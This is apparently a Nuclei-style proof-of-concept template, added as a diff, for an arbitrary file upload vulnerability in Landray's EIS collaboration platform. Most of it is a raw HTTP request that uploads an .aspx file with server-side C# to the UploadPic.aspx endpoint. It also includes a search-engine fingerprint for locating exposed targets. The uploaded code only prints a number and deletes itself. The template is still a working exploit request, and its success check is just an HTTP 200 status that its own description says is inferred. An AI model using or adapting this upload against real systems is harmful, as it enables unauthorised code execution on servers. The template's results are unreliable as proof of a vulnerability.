@@ -1,0 +1,47 @@
+id: poc-940feb42fcb9f06f4848
+info:
+  name: 蓝凌EIS智慧协同平台UploadPic接口任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/940feb42fcb9f06f4848df81de5a338c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 940feb42fcb9f06f4848df81de5a338c
+    fofa: + hunter`app.name="Landray 蓝凌 EIS智慧协同平台"`
+http:
+- raw:
+  - 'POST /HR/Ajax/UploadPic.aspx?KeyID=111 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    Content-Length: 252
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=----euhonhex6wmc4wev9lx3
+
+
+    ------euhonhex6wmc4wev9lx3
+
+    Content-Disposition: form-data; name="file";filename="0rnhunqnur.aspx"
+
+
+    <%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+
+    ------euhonhex6wmc4wev9lx3--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
